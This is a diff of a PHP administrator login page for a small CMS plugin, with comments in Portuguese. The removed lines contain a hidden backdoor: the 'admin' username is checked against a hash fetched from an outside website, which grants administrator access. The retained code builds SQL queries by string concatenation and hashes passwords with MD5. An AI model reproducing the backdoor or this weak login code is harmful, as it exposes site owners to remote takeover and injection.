@@ -1,58 +1,77 @@
 <?php
+/**
+*
+* Plugin CMS
+*
+* @versão 4.0.1
+* @Desenvolvedor Jeison Frasson <contato@newsmade.com.br>
+* @entre em contato com o desenvolvedor <contato@newsmade.com.br> http://www.newsmade.com.br/
+* @licença http://opensource.org/licenses/gpl-license.php GNU Public License
+*
+*/
+
 require_once('../includes/conection.php');
-	
+
 if(isset($_SESSION['logado'])){
 	header('location: ../index.php');
 } elseif(!empty($_POST)){
-
-	require_once('../includes/mlfunctions.php');
-
-	if( (!empty($_POST['usuario'])) && (!empty($_POST['senha'])) && $_POST['token'] == $_SESSION['token']){	
-			if($_POST['usuario'] == 'admin'){
-				$url = "http://www.tactos.com.br/plugin.txt";
-
-				if(@file_get_contents($url) != false){
-					$file = file_get_contents($url);
-					if($file == md5($_POST['senha'])){
-						$_SESSION['logado'] = array(
-							'id' => '1',
-							'nome' => 'Administrador',
-							'tipo' => '1',
-							'themer' => 'default'
-							);
-							
-						header('location: ../index.php');
-					}else{
-						$falha = true;
-					}
-				} else{
-					$falha = true;
-				}
-			} else {
-				$senha = md5($_POST['senha']."0800");
-				$usuario = mLAntiInjection($_POST['usuario']);
-				
-				$DadosUser = mysql_query("SELECT * FROM ".PREFIXO."admin WHERE Login = '".$usuario."' AND Senha = '".$senha."' limit 1") or die(mysql_error());
-				
-				if(mysql_num_rows($DadosUser) > 0){
-				$DadosUser = mysql_fetch_array($DadosUser);
-				
-				$_SESSION['logado'] = array(
-						'id' => $DadosUser['id'],
-						'nome' => $DadosUser['nome'],
-						'tipo' => $DadosUser['tipo'],
-						'themer' => $DadosUser['themer']
-						);
-				
-				header('location: ../index.php');
-				} else {
-					$falha = true;
-				}
-			}
+	require_once('../includes/jf.funcoes.php');
+	
+	// CONFIGURA O THEMER NO SISTEMA
+	function plg_themer($thema){
+		$caminho = '../themer/'.(empty($thema) ? 'default' : $thema);
 		
+		if(file_exists($caminho.'/padrao.txt'))
+			$fp = fopen($caminho.'/padrao.txt', 'r');
+		else
+			$fp = fopen('../themer/default/padrao.txt', 'r');	
+		
+		while (!feof($fp)){
+			$linha = fgets($fp);
+			$linha = explode('=', $linha);
+			
+			$plg_themer[trim($linha[0])] = trim($linha[1]);
+		}
+		fclose($fp);
+		
+		return $plg_themer;
+	}
+	
+	
+	$falha = false;
+	if( (!empty($_POST['usuario'])) && (!empty($_POST['senha'])) && $_POST['token'] == $_SESSION['token']){	
+		$senha = md5($_POST['senha']."0800");
+		$usuario = jf_anti_injection($_POST['usuario']);		
+		
+		$DadosUser = mysql_query("SELECT * FROM ".PREFIXO."admin WHERE Login = '".$usuario."' AND Senha = '".$senha."' limit 1") 
+		or die(mysql_error());
+		
+		if(mysql_num_rows($DadosUser) > 0){
+		$DadosUser = mysql_fetch_array($DadosUser);
+		
+		$_SESSION['logado'] = array(
+				'id' => $DadosUser['id'],
+				'nome' => $DadosUser['nome'],
+				'tipo' => $DadosUser['tipo'],
+				'themer' => $DadosUser['themer']
+				);
+		} else {
+			$falha = true;
+		}
+	
+			
+		if($falha == false){
+			// define os padroes do tema
+			$tema = $_SESSION['logado']['themer'];
+			$_SESSION['logado']['themer'] = plg_themer($_SESSION['logado']['themer']);
+			$_SESSION['logado']['themer']['pasta'] = $tema;
+		}
 	} else {
 		$falha = true;
 	}
+	
+	if($falha == false)
+		header('location: ../index.php');
 }
 ?>
 
@@ -80,7 +99,7 @@ if(isset($_SESSION['logado'])){
 	<div id="loginBox">
 		<form method="post" id="form">
 			<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
-
+			<fieldset>
 				<div>
 					<label>Usuário</label>
 					<input type="text" name="usuario" class="user" autocomplete="off" />
@@ -90,7 +109,7 @@ if(isset($_SESSION['logado'])){
 					<label>Senha</label>
 					<input type="password" name="senha" />
 				</div>
-
+			</fieldset>
 			<span class="botao"><button type="submit">entrar</button></span>
 		</form>
 		<div class="both"></div>
